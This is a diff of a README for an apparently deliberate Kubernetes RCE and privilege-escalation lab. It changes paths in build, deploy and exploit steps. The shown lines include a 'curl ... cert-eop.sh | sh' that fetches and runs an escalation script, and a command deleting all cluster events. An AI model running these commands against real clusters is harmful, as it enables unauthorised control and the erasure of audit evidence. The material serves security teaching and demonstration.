@@ -49,13 +49,13 @@ git clone github.com/handfields/go-rce-kubernetes
 
 2. Build the vulnerable go-rce container (Optional - containers are also available on dockerhub)
 ```
-cd go-rce-kubernetes && docker build .
+cd go-rce-kubernetes && docker build 01-image/.
 ```
 
 3. Deploy
 ```
-kubectl apply -f 00-loose-cert-rbac-policy.yaml
-kubectl apply -f 01-rce-deployment-bad.yaml
+kubectl apply -f 02-deployment/00-loose-cert-rbac-policy.yaml
+kubectl apply -f 02-deployment/01-rce-deployment-bad.yaml
 ```
  
 4. Exploit Vulnerablity 
@@ -87,7 +87,7 @@ Generate and sign client certificate with elevated permissions
 > Use script to skip this section:
 >
 >  ```
->  curl https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/cert-eop.sh | sh
+>  curl https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/03-h4ks/cert-eop.sh | sh
 >  ```
 > 
  
@@ -203,6 +203,8 @@ curl -L https://github.com/handfields/go-rce-kubernetes/releases/download/0.1.0/
 ./kubectl --kubeconfig=config delete events -A --all 
 ```
  
+<br>
+
 # General security guidance
 This section introduces some general best practice guidelines for operating secure containerized workloads
  
@@ -247,4 +249,3 @@ https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/<br>
 https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/<br>
 https://github.com/trailofbits/audit-kubernetes/tree/master/reports<br>
 https://blog.aquasec.com/container-vulnerability-dzmlt-dynamic-container-analysis<br>
-
